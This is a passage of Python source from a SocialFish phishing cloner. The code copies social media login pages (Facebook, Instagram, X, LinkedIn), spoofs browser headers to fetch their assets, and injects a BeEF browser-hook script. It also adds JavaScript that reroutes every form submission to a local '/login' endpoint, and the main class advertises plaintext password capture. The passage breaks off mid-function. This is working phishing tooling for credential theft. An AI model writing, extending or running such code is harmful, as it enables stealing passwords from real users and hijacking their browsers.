    # should be copied from your original code exactly as they are
    
    def _detect_resource_type_universal(self, url: str) -> str:
        """Universal resource type detection"""
        url_lower = url.lower()
        
        # Handle dynamic resource patterns (like Facebook's rsrc.php)
        if any(pattern in url for pattern in ['/rsrc.php/', '/resource/', '/assets/', '/static/']):
            # Try to detect from URL ending
            if url_lower.endswith('.svg') or '.svg' in url_lower:
                return 'svg'
            elif url_lower.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif')):
                return 'image'
            elif url_lower.endswith('.css'):
                return 'css'
            elif url_lower.endswith('.js'):
                return 'js'
            elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf']):
                return 'font'
            else:
                return 'asset'
        
        # Standard detection
        if url_lower.endswith('.svg'):
            return 'svg'
        elif url_lower.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif')):
            return 'image'
        elif url_lower.endswith('.css'):
            return 'css'
        elif url_lower.endswith('.js'):
            return 'js'
        elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf']):
            return 'font'
        
        return 'asset'
    
    def _is_font_resource(self, url: str) -> bool:
        """Check if URL is a font resource"""
        font_extensions = ['.woff', '.woff2', '.ttf', '.otf', '.eot']
        url_lower = url.lower()
        return any(ext in url_lower for ext in font_extensions)
    
    def _find_data_attribute_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Find resources in data attributes (lazy loading)"""
        resources = []
        
        # Common data attributes for lazy loading
        data_attrs = ['data-src', 'data-href', 'data-background', 'data-bg', 'data-original', 'data-lazy']
        
        for attr in data_attrs:
            for element in soup.find_all(attrs={attr: True}):
                src = element.get(attr)
                if src and self._is_valid_url_enhanced(src, base_url):
                    resource_type = self._detect_resource_type_universal(src)
                    resources.append((src, element, attr, resource_type))
        
        return resources
    
    def _find_css_background_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """CRITICAL FIX: Find background images and resources in CSS - FIXED FOR INSTAGRAM"""
        resources = []
        
        # Process inline styles - THIS IS WHERE INSTAGRAM LOGO IS
        for element in soup.find_all(style=True):
            style_content = element.get('style', '')
            urls = self._extract_urls_from_css_universal(style_content, base_url)
            for url in urls:
                resource_type = self._detect_resource_type_universal(url)
                # Don't store element reference for style URLs - we'll rewrite them later
                resources.append((url, None, 'style', resource_type))
        
        # Process style tags
        for style_tag in soup.find_all('style'):
            if style_tag.string:
                urls = self._extract_urls_from_css_universal(style_tag.string, base_url)
                for url in urls:
                    resource_type = self._detect_resource_type_universal(url)
                    resources.append((url, None, 'content', resource_type))
        
        return resources
    
    def _extract_urls_from_css_universal(self, css_content: str, base_url: str) -> List[str]:
        """Extract URLs from CSS content - universal patterns"""
        import re
        urls = []
        
        # Comprehensive URL patterns for CSS
        patterns = [
            r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)',  # Standard url()
            r'@import\s+["\']([^"\']+)["\']',  # @import statements
            r'src:\s*url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)'  # Font src
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, css_content, re.IGNORECASE)
            for match in matches:
                if self._is_valid_url_enhanced(match, base_url):
                    # Convert relative URLs to absolute
                    absolute_url = self._resolve_url(match, base_url)
                    if absolute_url:
                        urls.append(absolute_url)
        
        return urls
    
    def _find_js_embedded_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Find resources embedded in JavaScript code"""
        resources = []
        
        for script in soup.find_all('script'):
            if script.string:
                js_content = script.string
                urls = self._extract_urls_from_js_universal(js_content, base_url)
                for url in urls:
                    resource_type = self._detect_resource_type_universal(url)
                    resources.append((url, script, 'js-embedded', resource_type))
        
        return resources
    
    def _extract_urls_from_js_universal(self, js_content: str, base_url: str) -> List[str]:
        """Extract URLs from JavaScript content - enhanced universal patterns"""
        import re
        urls = []
        
        # Enhanced JavaScript URL patterns for better coverage
        patterns = [
            # Standard extensions
            r'["\']([^"\']*\.(svg|png|jpg|jpeg|gif|webp|css|js|woff|woff2|ttf|otf|avif|ico))["\']',
            
            # Dynamic resources (Facebook-style, Instagram-style)
            r'["\']([^"\']*\/rsrc\.php\/[^"\']*)["\']',
            r'["\']([^"\']*\/resource\/[^"\']*)["\']',
            r'["\']([^"\']*static\.cdninstagram\.com[^"\']*)["\']',
            r'["\']([^"\']*static\.xx\.fbcdn\.net[^"\']*)["\']',
            
            # Generic resource patterns
            r'["\']([^"\']*\/assets\/[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*\/static\/[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*\/dist\/[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*\/build\/[^"\']*\.[a-zA-Z]{2,4})["\']',
            
            # Chunk files (webpack/modern build systems)
            r'["\']([^"\']*chunk[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*vendors[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*runtime[^"\']*\.[a-zA-Z]{2,4})["\']',
            
            # JavaScript object properties
            r'src\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            r'url\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            r'href\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            
            # Import/require statements
            r'import\s+[^"\']*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            r'require\s*\(\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            
            # Webpack-style URLs
            r'__webpack_require__\.[a-zA-Z]+\s*\(\s*["\']([^"\']+)["\']',
            
            # Module federation and dynamic imports
            r'import\s*\(\s*["\']([^"\']+)["\']',
            r'loadChunk\s*\(\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                url = match[0] if isinstance(match, tuple) else match
                
                # Skip very short URLs or obvious non-resources
                if len(url) < 4 or url.startswith(('#', 'data:', 'blob:')):
                    continue
                
                if self._is_valid_url_enhanced(url, base_url):
                    absolute_url = self._resolve_url(url, base_url)
                    if absolute_url:
                        urls.append(absolute_url)
        
        return urls
    
    def _find_svg_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Find SVG-specific resources"""
        resources = []
        
        # Process inline SVG elements
        for svg_elem in soup.find_all('svg'):
            # Find image references within SVG
            for image in svg_elem.find_all('image'):
                href = image.get('href') or image.get('xlink:href')
                if href and self._is_valid_url_enhanced(href, base_url):
                    resources.append((href, image, 'href', 'image'))
            
            # Find use elements with external references
            for use in svg_elem.find_all('use'):
                href = use.get('href') or use.get('xlink:href')
                if href and href.startswith('http') and self._is_valid_url_enhanced(href, base_url):
                    resources.append((href, use, 'href', 'svg'))
        
        return resources
    
    def _find_dynamic_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Find dynamic resource patterns specific to various platforms"""
        resources = []
        
        # Search for any element with URL-like attributes
        url_attributes = ['src', 'href', 'data-src', 'data-href', 'data-url', 'data-image', 'content']
        
        for attr in url_attributes:
            for element in soup.find_all(attrs={attr: True}):
                value = element.get(attr)
                if value and self._looks_like_resource_url(value) and self._is_valid_url_enhanced(value, base_url):
                    resource_type = self._detect_resource_type_universal(value)
                    resources.append((value, element, attr, resource_type))
        
        return resources
    
    def _looks_like_resource_url(self, url: str) -> bool:
        """Check if a string looks like a resource URL"""
        if not url or len(url) < 4:
            return False
        
        # Skip non-URL strings
        if url.startswith(('javascript:', 'data:', 'blob:', 'mailto:', 'tel:', '#')):
            return False
        
        # Look for file extensions or resource patterns
        resource_indicators = [
            r'\.(svg|png|jpg|jpeg|gif|webp|css|js|woff|woff2|ttf|otf|avif)',
            r'/rsrc\.php/',
            r'/resource/',
            r'/assets/',
            r'/static/',
            r'/images/',
            r'/css/',
            r'/js/',
            r'/fonts/'
        ]
        
        return any(re.search(pattern, url, re.IGNORECASE) for pattern in resource_indicators)
    
    def _resolve_url(self, url: str, base_url: str) -> Optional[str]:
        """Resolve relative URL to absolute URL"""
        try:
            if not url or url.startswith(('data:', 'blob:', 'javascript:')):
                return None
            
            if url.startswith('//'):
                scheme = urllib.parse.urlparse(base_url).scheme
                return f"{scheme}:{url}"
            elif not url.startswith(('http://', 'https://')):
                return urllib.parse.urljoin(base_url, url)
            else:
                return url
        except Exception:
            return None
    
    def _is_valid_url_enhanced(self, url: str, base_url: str) -> bool:
        """Enhanced URL validation for universal compatibility"""
        if not url or url.startswith(('data:', 'blob:', 'javascript:', 'mailto:', 'tel:', '#')):
            return False
        
        # Allow dynamic resource patterns
        dynamic_patterns = ['/rsrc.php/', '/resource/', '/assets/', '/static/']
        if any(pattern in url for pattern in dynamic_patterns):
            return True
        
        # Enhanced domain handling
        allowed_patterns = ['facebook.com', 'fbcdn.net', 'fbsbx.com', 'instagram.com', 'cdninstagram.com', 'twitter.com', 'x.com', 'linkedin.com']
        skip_domains = ['fonts.googleapis.com', 'cdnjs.cloudflare.com']
        
        try:
            if url.startswith('//'):
                scheme = urllib.parse.urlparse(base_url).scheme
                url = f"{scheme}:{url}"
            elif not url.startswith(('http://', 'https://')):
                return True  # Relative URL
            
            parsed = urllib.parse.urlparse(url)
            
            # Skip known external CDNs
            if any(domain in parsed.netloc for domain in skip_domains):
                return False
            
            # Allow same domain or common platforms
            base_domain = urllib.parse.urlparse(base_url).netloc
            if parsed.netloc == base_domain:
                return True
            
            # Allow common social media domains and CDNs
            return any(pattern in parsed.netloc for pattern in allowed_patterns)
            
        except Exception:
            return False
    
    def _download_sync_universal_enhanced(self, url, output_dir, resource_type, base_url, referer=None):
        """ENHANCED: Universal synchronous download - works for any site"""
        try:
            import requests
            
            # Universal session setup
            session = requests.Session()
            session.verify = False
            session.timeout = 30
            
            # Enhanced headers based on URL and resource type
            headers = self._get_universal_headers(url, resource_type, base_url, referer)
            
            # Follow redirects properly
            response = session.get(url, headers=headers, timeout=30, verify=False, allow_redirects=True)
            
            if response.status_code == 200:
                content = response.content
                
                # Enhanced content validation
                if not self._validate_content(content, resource_type, response.headers):
                    logger.warning(f"Invalid content type for {resource_type} from {url}")
                    return None
                
                # Universal decompression
                content = self._universal_decompress(content, response.headers)
                
                # Update stats
                self.resource_manager.stats['downloaded'] += 1
                self.resource_manager.stats['bytes_downloaded'] += len(content)
                
                # Universal save logic
                local_path = self._universal_save_enhanced(content, url, output_dir, resource_type, response.headers)
                
                if local_path:
                    logger.debug(f"✅ Universal download saved: {local_path} ({len(content)} bytes)")
                    return local_path
            
            return None
            
        except Exception as e:
            logger.error(f"❌ Universal download failed for {url}: {e}")
            self.resource_manager.stats['failed'] += 1
            return None
    
    def _get_universal_headers(self, url, resource_type, base_url, referer=None):
        """Get universal headers that work for any site"""
        # Detect target domain for customization
        parsed_base = urllib.parse.urlparse(base_url)
        target_domain = parsed_base.netloc
        
        # Universal base headers
        headers = {
            'User-Agent': self._get_universal_user_agent(target_domain),
            'Accept': self._get_universal_accept_header(resource_type, url),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Referer': referer or base_url,
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        # Add security headers for modern sites
        fetch_site = self._get_fetch_site_universal(url, base_url)
        headers.update({
            'Sec-Fetch-Dest': self._get_fetch_dest_universal(resource_type),
            'Sec-Fetch-Mode': 'no-cors',
            'Sec-Fetch-Site': fetch_site,
        })
        
        # Platform-specific headers
        headers.update(self._get_platform_specific_headers(target_domain))
        
        return headers
    
    def _get_universal_user_agent(self, domain):
        """Get appropriate user agent for any domain"""
        # Use modern Chrome user agent for best compatibility
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    
    def _get_universal_accept_header(self, resource_type, url):
        """Get universal Accept header for any resource type"""
        # Enhanced accept headers for better compatibility
        if resource_type == 'svg' or '.svg' in url.lower():
            return 'image/svg+xml,image/*,*/*;q=0.8'
        elif resource_type == 'image':
            return 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
        elif resource_type == 'css':
            return 'text/css,*/*;q=0.1'
        elif resource_type == 'js':
            return 'application/javascript,text/javascript,*/*;q=0.01'
        elif resource_type == 'font':
            return 'font/woff2,font/woff,font/ttf,*/*;q=0.1'
        else:
            return '*/*'
    
    def _get_fetch_dest_universal(self, resource_type):
        """Get universal Sec-Fetch-Dest"""
        fetch_dest_map = {
            'image': 'image',
            'svg': 'image',
            'css': 'style',
            'js': 'script',
            'font': 'font',
        }
        return fetch_dest_map.get(resource_type, 'empty')
    
    def _get_fetch_site_universal(self, url, base_url):
        """Universal Sec-Fetch-Site determination"""
        try:
            url_domain = urllib.parse.urlparse(url).netloc
            base_domain = urllib.parse.urlparse(base_url).netloc
            
            if url_domain == base_domain:
                return 'same-origin'
            elif url_domain.endswith('.'.join(base_domain.split('.')[-2:])):
                return 'same-site'
            else:
                return 'cross-site'
        except:
            return 'cross-site'
    
    def _get_platform_specific_headers(self, domain):
        """Get platform-specific headers for better compatibility"""
        headers = {}
        
        # Social media platform specific headers
        social_platforms = ['facebook.com', 'instagram.com', 'cdninstagram.com', 'twitter.com', 'x.com', 'linkedin.com']
        
        if any(platform in domain for platform in social_platforms):
            headers.update({
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"'
            })
        
        return headers
    
    def _validate_content(self, content, resource_type, headers):
        """Validate that downloaded content matches expected type"""
        if not content:
            return False
        
        content_type = headers.get('content-type', '').lower()
        
        # Check for HTML returned instead of expected content
        if resource_type in ['image', 'svg', 'font'] and ('html' in content_type or content.startswith(b'<!DOCTYPE') or content.startswith(b'<html')):
            return False
        
        # Additional validation for specific types
        if resource_type == 'svg':
            # SVG should start with SVG tag or be valid XML
            if not (content.startswith(b'<svg') or content.startswith(b'<?xml')):
                return False
        
        return True
    
    def _universal_decompress(self, content, headers):
        """Universal decompression that works for any site"""
        if not content:
            return content
            
        encoding = headers.get('content-encoding', '').lower()
        
        try:
            if 'br' in encoding:
                return brotli.decompress(content)
            elif 'gzip' in encoding:
                return gzip.decompress(content)
            elif 'deflate' in encoding:
                return zlib.decompress(content)
        except Exception as e:
            logger.debug(f"Decompression failed, using raw content: {e}")
            # Magic byte detection fallback
            if content[:2] == b'\x1f\x8b':
                try:
                    return gzip.decompress(content)
                except:
                    pass
            elif content[0:1] == b'\x78':
                try:
                    return zlib.decompress(content)
                except:
                    pass
        
        return content
    
    def _universal_save_enhanced(self, content, url, output_dir, resource_type, headers):
        """Enhanced universal save logic with filename length protection"""
        parsed_url = urllib.parse.urlparse(url)
        
        # Handle dynamic resource URLs (like Facebook's rsrc.php)
        if any(pattern in url for pattern in ['/rsrc.php/', '/resource/', '/assets/', '/static/']):
            return self._save_dynamic_resource_safe(content, url, output_dir, resource_type, headers)
        
        # Check filename length for original path preservation
        if resource_type in ['image', 'svg'] and parsed_url.path and parsed_url.path != '/':
            original_path = parsed_url.path.lstrip('/')
            
            # CRITICAL FIX: Check total path length to prevent filesystem errors
            full_path = output_dir / original_path
            if len(str(full_path)) > 250:  # Safe limit for most filesystems
                logger.warning(f"Path too long, using hash-based naming: {len(str(full_path))} chars")
                return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
            
            try:
                file_path = output_dir / original_path
                file_path.parent.mkdir(parents=True, exist_ok=True)
                local_path = original_path
            except OSError as e:
                logger.warning(f"Path creation failed: {e}, using hash-based naming")
                return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
        else:
            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
        
        # Universal binary save (works for all sites)
        try:
            with open(file_path, 'wb') as f:
                f.write(content)
            return local_path
        except OSError as e:
            logger.error(f"File save failed: {e}, trying hash-based naming")
            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
    
    def _save_dynamic_resource_safe(self, content, url, output_dir, resource_type, headers):
        """Save dynamic resources with safe filename handling"""
        parsed_url = urllib.parse.urlparse(url)
        
        # Extract filename from dynamic URL
        path_parts = parsed_url.path.split('/')
        original_filename = path_parts[-1] if path_parts else 'resource'
        
        # SAFE FILENAME: Limit length and sanitize
        if len(original_filename) > 100:  # Too long, use hash
            url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
            extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
            filename = f"dyn_{url_hash}{extension}"
        else:
            # Use original but ensure proper extension
            if '.' not in original_filename:
                extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
                filename = f"{original_filename}{extension}"
            else:
                filename = original_filename
        
        # Sanitize filename for filesystem safety
        filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
        
        # Save in appropriate subdirectory
        subdir = self._get_subdir_enhanced(resource_type)
        resource_dir = output_dir / subdir
        resource_dir.mkdir(exist_ok=True)
        file_path = resource_dir / filename
        local_path = f"{subdir}/{filename}"
        
        # Ensure path isn't too long
        if len(str(file_path)) > 250:
            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
        
        # Save file
        try:
            with open(file_path, 'wb') as f:
                f.write(content)
            return local_path
        except OSError as e:
            logger.warning(f"Dynamic resource save failed: {e}, using hash fallback")
            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
    
    def _save_with_hash_name(self, content, url, output_dir, resource_type, headers):
        """Fallback save method using hash-based naming (always works)"""
        url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
        extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
        filename = f"res_{url_hash}{extension}"
        subdir = self._get_subdir_enhanced(resource_type)
        resource_dir = output_dir / subdir
        resource_dir.mkdir(exist_ok=True)
        file_path = resource_dir / filename
        local_path = f"{subdir}/{filename}"
        
        # This should always work as it's a short, safe filename
        with open(file_path, 'wb') as f:
            f.write(content)
        
        return local_path
    
    def _get_extension_enhanced(self, url: str, content_type: str, resource_type: str) -> str:
        """Enhanced extension detection"""
        # Try URL extension first
        try:
            parsed = urllib.parse.urlparse(url)
            if parsed.path:
                _, ext = os.path.splitext(parsed.path)
                if ext and len(ext) <= 5:
                    return ext
        except Exception:
            pass
        
        # Enhanced content type mapping
        extensions = {
            'text/css': '.css',
            'application/javascript': '.js',
            'text/javascript': '.js',
            'image/jpeg': '.jpg',
            'image/png': '.png',
            'image/gif': '.gif',
            'image/svg+xml': '.svg',
            'image/webp': '.webp',
            'image/avif': '.avif',
            'font/woff2': '.woff2',
            'font/woff': '.woff',
            'application/font-woff': '.woff',
            'application/font-woff2': '.woff2',
            'font/ttf': '.ttf',
            'font/otf': '.otf'
        }
        
        # Special handling for resource types
        if resource_type == 'svg':
            return '.svg'
        elif resource_type == 'image' and not content_type:
            return '.jpg'  # Default for images
        
        return extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
    
    def _get_subdir_enhanced(self, resource_type: str) -> str:
        """Enhanced subdirectory mapping"""
        subdirs = {
            'css': 'css',
            'js': 'js', 
            'image': 'images',
            'svg': 'images',  # SVGs go in images folder
            'font': 'fonts',
            'asset': 'assets'
        }
        return subdirs.get(resource_type, 'assets')
    
    def _create_placeholder_resources(self, output_dir: Path):
        """Create placeholder files for common missing resources to prevent 404s"""
        try:
            # Common missing files that cause 404s
            placeholder_files = [
                ('favicon.ico', 'assets', b''),  # Empty favicon
                ('fluidicon.png', 'images', b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\xda\x63\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'),  # 1x1 PNG
                ('hsts-pixel.gif', 'images', b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;'),  # 1x1 GIF
                ('chunk-vendors.js', 'js', b'// Placeholder chunk file\nconsole.log("Chunk loaded");'),
                ('runtime.js', 'js', b'// Placeholder runtime\nwindow.__webpack_require__ = function(){};'),
                ('polyfill.js', 'js', b'// Placeholder polyfill\n'),
                ('main.js', 'js', b'// Placeholder main script\n'),
            ]
            
            for filename, subdir, content in placeholder_files:
                file_dir = output_dir / subdir
                file_dir.mkdir(exist_ok=True)
                file_path = file_dir / filename
                
                # Only create if doesn't exist
                if not file_path.exists():
                    with open(file_path, 'wb') as f:
                        f.write(content)
                    logger.debug(f"Created placeholder: {file_path}")
            
            # Create common subdirectories if they don't exist
            for subdir in ['security', 'cdn-cgi/challenge-platform/scripts/jsd', 'token']:
                (output_dir / subdir).mkdir(parents=True, exist_ok=True)
            
        except Exception as e:
            logger.debug(f"Placeholder creation failed: {e}")  # Non-critical, just log
    
    async def _save_resource(self, content: bytes, metadata: Dict[str, Any],
                           resource_type: str, output_dir: Path) -> Optional[str]:
        """Save resource with SIMPLE binary/text handling - no async file ops for binary"""
        try:
            url = metadata.get('url', '')
            content_type = metadata.get('content_type', '')
            extension = self._get_extension_enhanced(url, content_type, resource_type)
            parsed_url = urllib.parse.urlparse(url)
            
            # Validate content
            if not content:
                logger.warning(f"Empty content for {url}")
                return None
            
            # Determine save path - preserve structure for images
            if resource_type in ['image', 'svg'] and parsed_url.path and parsed_url.path != '/':
                original_path = parsed_url.path.lstrip('/')
                file_path = output_dir / original_path
                file_path.parent.mkdir(parents=True, exist_ok=True)
                local_path = original_path
            else:
                url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
                filename = f"resource_{url_hash}{extension}"
                subdir = self._get_subdir_enhanced(resource_type)
                resource_dir = output_dir / subdir
                resource_dir.mkdir(exist_ok=True)
                file_path = resource_dir / filename
                local_path = f"{subdir}/{filename}"
            
            # SIMPLE FIX: Use regular file operations like the working code
            is_text = self._is_text_content_type(content_type, resource_type)
            
            if is_text:
                # Text content - decode and save
                try:
                    text_content = content.decode('utf-8', errors='ignore')
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(text_content)
                except Exception as e:
                    logger.error(f"Text save failed for {url}: {e}")
                    return None
            else:
                # Binary content - EXACTLY like working code
                with open(file_path, 'wb') as f:
                    f.write(content)  # Direct binary write, no async
            
            # Verify file
            if not file_path.exists() or file_path.stat().st_size == 0:
                logger.error(f"File not written: {file_path}")
                return None
            
            logger.debug(f"Saved {resource_type}: {file_path} ({len(content)} bytes)")
            return local_path
            
        except Exception as e:
            logger.error(f"Save failed for {url}: {e}")
            return None
    
    def _remove_tracking_scripts(self, soup: BeautifulSoup):
        """Remove tracking and analytics scripts"""
        tracking_patterns = [
            r'google-analytics\.com',
            r'googletagmanager\.com',
            r'facebook\.net',
            r'doubleclick\.net',
            r'hotjar\.com'
        ]
        
        for script in soup.find_all(['script', 'iframe']):
            src = script.get('src', '')
            if any(re.search(pattern, src, re.I) for pattern in tracking_patterns):
                script.decompose()
    
    def _add_beef_hook(self, soup: BeautifulSoup):
        """Add BeEF hook for penetration testing"""
        script = soup.new_tag('script')
        script['src'] = 'http://localhost:3000/hook.js'
        
        body = soup.find('body')
        if body:
            body.append(script)
    
    def _add_universal_ajax_blocking(self, soup: BeautifulSoup):
        """Enhanced universal AJAX blocking to prevent 405 errors on any site"""
        script = soup.new_tag('script')
        script.string = '''
        (function() {
            // Enhanced Universal AJAX blocking to prevent 405 errors
            const blockedPatterns = [
                '/ajax/', '/api/', '/graphql', '/_api/', '/rpc/',
                '/webstorage', '/analytics', '/tracking', '/metrics',
                '/beacon', '/collect', '/report', '/log', '/bz?',
                '/process_keys', '/telemetry', '/events', '/ping'
            ];
            
            // Enhanced XMLHttpRequest blocking
            if (window.XMLHttpRequest) {
                const originalOpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                    if (typeof url === 'string' && blockedPatterns.some(pattern => url.includes(pattern))) {
                        console.log('🛡️ Blocked AJAX call to prevent 405 error:', url);
                        // Create a mock XHR that appears to work but doesn't make requests
                        this.readyState = 4;
                        this.status = 200;
                        this.responseText = '{}';
                        this.response = '{}';
                        setTimeout(() => {
                            if (typeof this.onreadystatechange === 'function') {
                                this.onreadystatechange();
                            }
                            if (typeof this.onload === 'function') {
                                this.onload();
                            }
                        }, 10);
                        return;
                    }
                    return originalOpen.call(this, method, url, async, user, password);
                };
                
                // Also block send to be extra safe
                const originalSend = XMLHttpRequest.prototype.send;
                XMLHttpRequest.prototype.send = function(data) {
                    if (this.readyState === 4) return; // Already blocked
                    return originalSend.call(this, data);
                };
            }
            
            // Enhanced fetch blocking with better error handling
            if (window.fetch) {
                const originalFetch = window.fetch;
                window.fetch = function(url, options) {
                    if (typeof url === 'string' && blockedPatterns.some(pattern => url.includes(pattern))) {
                        console.log('🛡️ Blocked fetch call to prevent 405 error:', url);
                        return Promise.resolve(new Response('{}', {
                            status: 200,
                            statusText: 'OK',
                            headers: new Headers({'Content-Type': 'application/json'})
                        }));
                    }
                    return originalFetch.apply(this, arguments).catch(err => {
                        console.log('🛡️ Fetch error caught and handled:', err);
                        return new Response('{}', {status: 200});
                    });
                };
            }
            
            // Block WebSocket connections that might cause issues
            if (window.WebSocket) {
                const originalWebSocket = window.WebSocket;
                window.WebSocket = function(url, protocols) {
                    console.log('🛡️ Blocked WebSocket connection:', url);
                    const mockSocket = {
                        close: function() {},
                        send: function() {},
                        addEventListener: function() {},
                        removeEventListener: function() {},
                        readyState: 3, // CLOSED
                        CONNECTING: 0, OPEN: 1, CLOSING: 2, CLOSED: 3
                    };
                    // Trigger close event after a delay
                    setTimeout(() => {
                        if (typeof mockSocket.onclose === 'function') {
                            mockSocket.onclose();
                        }
                    }, 100);
                    return mockSocket;
                };
            }
            
            // Block Service Workers that might interfere
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register = function() {
                    console.log('🛡️ Blocked service worker registration');
                    return Promise.resolve({unregister: () => Promise.resolve()});
                };
            }
            
            // Silence console errors for blocked requests
            const originalError = console.error;
            console.error = function(...args) {
                const message = args[0];
                if (typeof message === 'string' && 
                    (message.includes('405') || message.includes('Failed to fetch') || 
                     message.includes('NetworkError') || message.includes('CORS'))) {
                    console.log('🛡️ Suppressed error:', message);
                    return;
                }
                return originalError.apply(this, args);
            };
        })();
        '''
        
        head = soup.find('head')
        if head:
            head.insert(0, script)
    
    def _add_socialfish_js(self, soup: BeautifulSoup):
        """Add SocialFish-specific JavaScript"""
        script = soup.new_tag('script')
        script.string = '''
        (function() {
            // SocialFish form override
            document.addEventListener('DOMContentLoaded', function() {
                document.querySelectorAll('form').forEach(function(form) {
                    form.addEventListener('submit', function(e) {
                        // Let SocialFish handle the form submission
                        this.action = '/login';
                        this.method = 'post';
                    });
                });
            });
        })();
        '''
        
        head = soup.find('head')
        if head:
            head.insert(0, script)

class SocialFishCloner:
    """Main cloner class for SocialFish integration with PASSWORD CAPTURE"""
    
    def __init__(self, config: SocialFishConfig = None):
        self.config = config or SocialFishConfig()
        self.user_agent_manager = AdvancedUserAgentManager()
        self.resource_manager = SocialFishResourceManager(self.config)
        self.content_processor = SocialFishContentProcessor(self.config, self.resource_manager)
        self.browser_manager = SocialFishBrowserManager(self.config)
    
    async def clone_website_async(self, url: str, user_agent: str, beef_enabled: bool = False) -> bool:
        """Async clone website for SocialFish with PASSWORD CAPTURE"""
        start_time = time.time()
        
        try:
            logger.info(f"🚀 Starting SocialFish clone with PASSWORD CAPTURE: {url}")
            
            # Setup output directory (SocialFish structure)
            output_dir = self._create_output_directory(url, user_agent)
            if not output_dir:
                return False
            
            # Get user agent data
            user_agent_data = self.user_agent_manager.get_agent_for_user_agent(user_agent)
            
            # Initialize components
            await self.resource_manager.initialize_sessions(user_agent_data)
            self.browser_manager.driver = self.browser_manager.initialize_browser(user_agent)
            
            # Get page content with PASSWORD CAPTURE
            html_content = await self._get_page_content_with_password_capture(url)
            if not html_content:
                logger.error("❌ Failed to retrieve page content")
                return False
            
            logger.info(f"✅ Retrieved content: {len(html_content)} characters")
            
            # Process content
            processed_html = await self.content_processor.process_html(
                html_content, url, output_dir, beef_enabled
            )
            
            # Save main HTML file
            index_path = output_dir / 'index.html'
            async with aiofiles.open(index_path, 'w', encoding='utf-8') as f:
                await f.write(f'<!DOCTYPE html>\n{processed_html}')
            
            # Save metadata with PASSWORD CAPTURE info
            await self._save_metadata_with_password_info(url, output_dir, start_time)
            
            duration = time.time() - start_time
            logger.info(f"🎉 SocialFish PASSWORD CAPTURE clone completed in {duration:.2f}s")
            logger.info(f"📊 Stats: {self.resource_manager.stats}")
            logger.info(f"🔑 Password capture enabled: {self.config.capture_passwords_plaintext}")
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Cloning failed: {e}")
            return False
        
        finally:
            await self._cleanup()
    
    def _create_output_directory(self, url: str, user_agent: str) -> Optional[Path]:
        """Create output directory in SocialFish structure"""
        try:
            # Clean user agent for directory name
            safe_agent = re.sub(r'[^\w\-_.]', '_', user_agent)
            
            # Extract domain from URL
            parsed_url = urllib.parse.urlparse(url)
            domain = parsed_url.netloc
            safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
            
            # Create SocialFish directory structure
            output_dir = Path(self.config.output_base) / safe_agent / safe_domain
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Create subdirectories
